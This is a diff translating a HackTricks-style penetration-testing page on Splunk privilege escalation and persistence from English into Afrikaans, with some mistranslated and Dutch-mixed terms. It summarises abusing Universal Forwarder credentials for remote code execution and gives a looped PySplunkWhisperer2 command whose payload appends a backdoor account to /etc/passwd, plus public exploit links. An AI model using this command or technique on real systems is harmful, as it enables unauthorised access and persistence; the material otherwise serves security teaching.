@@ -1,52 +1,50 @@
-# Splunk LPE and Persistence
+# Splunk LPE en Volharding
 
 {{#include ../../banners/hacktricks-training.md}}
 
-If **enumerating** a machine **internally** or **externally** you find **Splunk running** (port 8090), if you luckily know any **valid credentials** you can **abuse the Splunk service** to **execute a shell** as the user running Splunk. If root is running it, you can escalate privileges to root.
+As **jy 'n masjien **intern** of **extern** op **enumerate**, en jy vind **Splunk wat loop** (poort 8090), as jy gelukkig enige **geldige akrediteer** ken, kan jy die **Splunk diens misbruik** om 'n **shell** as die gebruiker wat Splunk loop, te **voer**. As root dit loop, kan jy voorregte na root opgradeer.
 
-Also if you are **already root and the Splunk service is not listening only on localhost**, you can **steal** the **password** file **from** the Splunk service and **crack** the passwords, or **add new** credentials to it. And maintain persistence on the host.
+As jy ook **alreeds root is en die Splunk diens nie net op localhost luister nie**, kan jy die **wagwoord** lêer **van** die Splunk diens **steel** en die wagwoorde **krak**, of **nuwe** akrediteer daaraan **toevoeg**. En volharding op die gasheer handhaaf.
 
-In the first image below you can see how a Splunkd web page looks like.
+In die eerste beeld hieronder kan jy sien hoe 'n Splunkd webblad lyk.
 
-## Splunk Universal Forwarder Agent Exploit Summary
+## Splunk Universele Voorouer Agent Exploit Samevatting
 
-For further details check the post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). This is just a sumary:
+Vir verdere besonderhede, kyk na die pos [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dit is net 'n samevatting:
 
-**Exploit Overview:**
-An exploit targeting the Splunk Universal Forwarder Agent (UF) allows attackers with the agent password to execute arbitrary code on systems running the agent, potentially compromising an entire network.
+**Exploit Oorsig:**
+'n Exploit wat die Splunk Universele Voorouer Agent (UF) teiken, laat aanvallers met die agent wagwoord toe om arbitrêre kode op stelsels wat die agent loop, uit te voer, wat moontlik 'n hele netwerk in gevaar stel.
 
-**Key Points:**
+**Belangrike Punten:**
 
-- The UF agent does not validate incoming connections or the authenticity of code, making it vulnerable to unauthorized code execution.
-- Common password acquisition methods include locating them in network directories, file shares, or internal documentation.
-- Successful exploitation can lead to SYSTEM or root level access on compromised hosts, data exfiltration, and further network infiltration.
+- Die UF agent valideer nie inkomende verbindings of die egtheid van kode nie, wat dit kwesbaar maak vir ongeoorloofde kode-uitvoering.
+- Algemene wagwoord verkrygingsmetodes sluit in om hulle in netwerk gidse, lêer deelings, of interne dokumentasie te vind.
+- Suksevolle uitbuiting kan lei tot SYSTEM of root vlak toegang op gecompromitteerde gasheers, data-uitvloeiing, en verdere netwerk infiltrasie.
 
-**Exploit Execution:**
+**Exploit Uitvoering:**
 
-1. Attacker obtains the UF agent password.
-2. Utilizes the Splunk API to send commands or scripts to the agents.
-3. Possible actions include file extraction, user account manipulation, and system compromise.
+1. Aanvaller verkry die UF agent wagwoord.
+2. Gebruik die Splunk API om opdragte of skripte na die agente te stuur.
+3. Mogelijke aksies sluit lêer ekstraksie, gebruiker rekening manipulasie, en stelsel kompromie in.
 
-**Impact:**
+**Impak:**
 
-- Full network compromise with SYSTEM/root level permissions on each host.
-- Potential for disabling logging to evade detection.
-- Installation of backdoors or ransomware.
+- Volledige netwerk kompromie met SYSTEM/root vlak toestemmings op elke gasheer.
+- Potensiaal om logging te deaktiveer om opsporing te ontduik.
+- Installering van agterdeure of ransomware.
 
-**Example Command for Exploitation:**
-
+**Voorbeeld Opdrag vir Uitbuiting:**
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
-
-**Usable public exploits:**
+**Gebruikbare openbare exploits:**
 
 - https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
 - https://www.exploit-db.com/exploits/46238
 - https://www.exploit-db.com/exploits/46487
 
-## Abusing Splunk Queries
+## Misbruik van Splunk-vrae
 
-**For further details check the post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
+**Vir verdere besonderhede, kyk na die pos [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
 
 {{#include ../../banners/hacktricks-training.md}}
